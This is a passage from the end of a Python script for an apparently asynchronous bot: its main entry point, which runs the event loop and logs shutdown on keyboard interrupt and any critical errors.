        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("👋 Bot stopped")
    except Exception as e:
        logger.error(f"Critical error: {e}")
